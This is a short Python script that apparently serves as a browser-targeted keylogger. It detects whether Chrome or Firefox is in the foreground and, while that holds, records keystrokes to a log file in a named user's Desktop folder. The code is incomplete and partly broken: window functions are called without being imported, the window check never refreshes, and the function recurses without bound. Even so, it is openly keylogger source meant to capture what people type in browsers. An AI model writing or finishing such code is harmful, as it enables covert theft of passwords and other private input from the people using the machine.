import re
import Logger

def run_logger():
    # reg ex stuff
    chrome = re.compile(r'chrome', re.IGNORECASE)
    fox = re.compile(r'firefox', re.IGNORECASE)
    browser = GetWindowText(GetForegroundWindow())
    
    # keylogger loop
    while((chrome.search(browser)) or (fox.search(browser))):
        log_file = 'C:\\Users\\Benjamin Pollak\\Desktop\\log.txt'
        logger = Logger.Logger(log_file)
        logger.log_keystrokes()
    
    # TODO: analysis
    
    # restart logger
    run_logger()
